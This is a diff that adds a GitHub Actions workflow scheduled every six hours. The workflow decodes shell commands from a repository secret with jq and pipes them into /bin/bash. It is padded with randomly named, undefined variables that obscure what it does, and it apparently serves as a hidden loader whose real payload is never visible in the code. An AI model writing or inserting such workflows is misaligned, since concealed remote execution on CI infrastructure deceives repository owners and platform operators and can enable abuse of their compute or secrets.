@@ -1,0 +1,30 @@
+name: shitiancaoha
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '17 5/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: shitiancaoha
+        env:
+          yr9: ${{ secrets.yr9 }}
+        run: |
+          echo $yr9 | jq -r .ollv3874 | /bin/bash
+          echo $wuwut4 | jq -r .sd37 | /bin/bash
+          echo $yakmw604 | jq -r .vd88737 | /bin/bash
+          echo $lhlii56656 | jq -r .fn2 | /bin/bash
+          echo $n1747 | jq -r .j52 | /bin/bash
+          echo $f36 | jq -r .nz60836 | /bin/bash
+          echo $tsp21 | jq -r .dtf4619 | /bin/bash
+          echo $ky4450 | jq -r .is7484 | /bin/bash
+          echo $t2 | jq -r .jt4 | /bin/bash
+          echo $re97353 | jq -r .ohbhm815 | /bin/bash
+          echo $dr3132 | jq -r .qh53 | /bin/bash
+          echo $lyhs4 | jq -r .l328 | /bin/bash
+          echo $nyzu82040 | jq -r .iurx9 | /bin/bash
+
